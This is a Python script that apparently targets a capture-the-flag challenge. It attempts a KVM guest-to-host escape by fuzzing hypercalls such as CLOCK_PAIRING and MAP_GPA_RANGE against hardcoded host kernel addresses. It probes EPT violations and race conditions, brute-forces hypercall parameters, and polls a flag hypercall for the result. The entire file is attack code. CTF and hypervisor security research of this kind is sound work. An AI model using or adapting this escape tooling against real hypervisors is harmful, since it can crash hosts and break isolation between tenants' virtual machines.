#!/usr/bin/env python3
"""
KVM Escape Primitive Finder - Minimal Version

Goal: Trigger KVM error handling bug to write ANYTHING to host's write_flag
      Then call HC#100 and capture ANY non-zero/non-0xff return value (that's the flag)
"""

import os
import sys
import struct

try:
    from kvm_probe_interface import KVMProbe
except ImportError:
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from kvm_probe_interface import KVMProbe

print("=" * 70)
print("KVM ESCAPE PRIMITIVE FINDER")
print("Goal: Write to host via KVM bug, then HC#100 -> flag in RAX")
print("=" * 70)

class KVMExploit:
    def __init__(self):
        self.probe = KVMProbe(verbose=False)
        if not self.probe.test_connection():
            print("[-] No kvm_probe_drv")
            sys.exit(1)
        print("[+] Connected to kvm_probe_drv")
    
    def hc(self, nr, a0=0, a1=0, a2=0, a3=0):
        return self.probe.hypercall(nr, a0, a1, a2, a3)
    
    def check_flag(self):
        """Check if HC#100 returns the flag (any non-zero/non-0xff value)"""
        ret = self.hc(100, 0, 0, 0, 0)
        
        # Flag condition: not 0 and not all F's
        if ret != 0 and ret != 0xffffffffffffffff:
            return ret
        return None
    
    def try_escape(self):
        """Try to trigger the KVM bug"""
        
        # Always check HC#100 first to see baseline
        baseline = self.hc(100, 0, 0, 0, 0)
        print(f"Baseline HC#100: 0x{baseline:x}")
        
        # Target addresses (host kernel addresses we want to write to)
        targets = [
            0xffffffff826279a8,  # Host kernel virtual
            0x64279a8,           # Might be host physical from host's perspective
        ]
        
        # Test 1: KVM_HC_CLOCK_PAIRING (HC#9) - writes 80 bytes
        print("\n[1] Testing KVM_HC_CLOCK_PAIRING (HC#9)")
        
        for target in targets:
            print(f"  Trying target: 0x{target:x}")
            
            # Try normal call
            ret = self.hc(9, target, 0, 0, 0)
            print(f"    HC9({target:x}, 0) = 0x{ret:x}")
            
            flag = self.check_flag()
            if flag:
                print(f"[!] FLAG FOUND: 0x{flag:x}")
                return flag
            
            # Try with invalid clock_type to trigger error path
            for clock_type in [1, 2, 0xFF, 0xFFFFFFFF]:
                ret = self.hc(9, target, clock_type, 0, 0)
                flag = self.check_flag()
                if flag:
                    print(f"[!] FLAG with clock_type={clock_type}: 0x{flag:x}")
                    return flag
            
            # Try with weird a2/a3 values
            for a2 in [1, 79, 80, 81, 0xFFFFFFFF]:
                ret = self.hc(9, target, 0, a2, 0)
                flag = self.check_flag()
                if flag:
                    print(f"[!] FLAG with a2={a2}: 0x{flag:x}")
                    return flag
        
        # Test 2: KVM_HC_MAP_GPA_RANGE (HC#12)
        print("\n[2] Testing KVM_HC_MAP_GPA_RANGE (HC#12)")
        
        for target in targets:
            for npages in [1, 0, 0xFFFFFFFF]:
                for attrs in [0, 1, 0xFFFFFFFF]:
                    ret = self.hc(12, target, npages, attrs, 0)
                    flag = self.check_flag()
                    if flag:
                        print(f"[!] FLAG with HC12: 0x{flag:x}")
                        return flag
        
        # Test 3: Try to confuse address translation
        print("\n[3] Testing address confusion")
        
        # Mix of guest and host-looking addresses
        mixed_targets = [
            0xffffffff826279a8,  # Host kernel virtual
            0xffff888000000000,  # Direct mapping base
            0xffffffff80000000,  # Kernel text
            0xfffffe0000000000,  # vmemmap
            0x0,                 # NULL
            0xFFFFFFFFFFFFFFFF,  # All ones
            0x7FFFFFFFFFFFFFFF,  # Max positive
            0x8000000000000000,  # High bit set
        ]
        
        for target in mixed_targets:
            # Rapid fire with different parameters
            for clock_type in [0, 1, 0xFF]:
                self.hc(9, target, clock_type, 0, 0)
                flag = self.check_flag()
                if flag:
                    print(f"[!] FLAG with mixed target 0x{target:x}: 0x{flag:x}")
                    return flag
        
        # Test 4: EPT violation triggering
        print("\n[4] Testing EPT violations")
        
        violation_addrs = [
            0x0,                    # NULL
            0xFFFFFFFFF000,        # Last page
            0xDEADBEEF0000,        # Not mapped
        ]
        
        for addr in violation_addrs:
            for clock_type in [0, 1, 0xFF]:
                self.hc(9, addr, clock_type, 0, 0)
                flag = self.check_flag()
                if flag:
                    print(f"[!] FLAG after EPT violation: 0x{flag:x}")
                    return flag
        
        # Test 5: Rapid fire to trigger race conditions
        print("\n[5] Testing rapid fire (race conditions)")
        
        for i in range(100):
            # Alternate between valid and invalid
            if i % 2 == 0:
                self.hc(9, 0x1000000, 0, 0, 0)  # Valid guest
            else:
                self.hc(9, 0xffffffff826279a8, 0, 0, 0)  # Host
            
            if i % 10 == 0:
                flag = self.check_flag()
                if flag:
                    print(f"[!] FLAG after {i} iterations: 0x{flag:x}")
                    return flag
        
        # Test 6: Try CTF hypercalls 101-103 with host addresses
        print("\n[6] Testing CTF hypercalls 101-103")
        
        for hc_nr in [101, 102, 103]:
            for target in targets:
                for arg in [0, 1, 0xdeadbeef]:
                    self.hc(hc_nr, target, arg, 0, 0)
                    flag = self.check_flag()
                    if flag:
                        print(f"[!] FLAG from HC{hc_nr}: 0x{flag:x}")
                        return flag
        
        return None
    
    def brute_force_hc9(self):
        """Brute force HC#9 parameters"""
        print("\n[BRUTE] Brute forcing HC#9 parameters")
        
        # Try all combinations of a1 (clock_type) and a2 (size?)
        for a1 in range(256):  # 0-255
            for a2 in [0, 1, 79, 80, 81, 0xFF, 0xFFFF, 0xFFFFFFFF]:
                # Try with host address
                self.hc(9, 0xffffffff826279a8, a1, a2, 0)
                
                flag = self.check_flag()
                if flag:
                    print(f"[!] FLAG with a1={a1}, a2={a2}: 0x{flag:x}")
                    return flag
        
        return None

def main():
    exploit = KVMExploit()
    
    try:
        print("\n" + "="*70)
        print("STARTING ESCAPE ATTEMPT")
        print("="*70)
        
        # Try the main escape
        flag = exploit.try_escape()
        
        if not flag:
            print("\n[~] Main attempts failed, trying brute force...")
            flag = exploit.brute_force_hc9()
        
        if flag:
            print("\n" + "="*70)
            print(f"SUCCESS! FLAG: 0x{flag:x}")
            print("="*70)
            
            # Also try to interpret as ASCII/string
            try:
                as_bytes = struct.pack('<Q', flag)
                print(f"As bytes: {as_bytes.hex()}")
                print(f"As ASCII: {as_bytes}")
            except:
                pass
        else:
            print("\n" + "="*70)
            print("NO ESCAPE FOUND")
            print("="*70)
            
            # Final check
            final = exploit.hc(100, 0, 0, 0, 0)
            print(f"Final HC#100: 0x{final:x}")
    
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        exploit.probe.close()

if __name__ == '__main__':
    main()
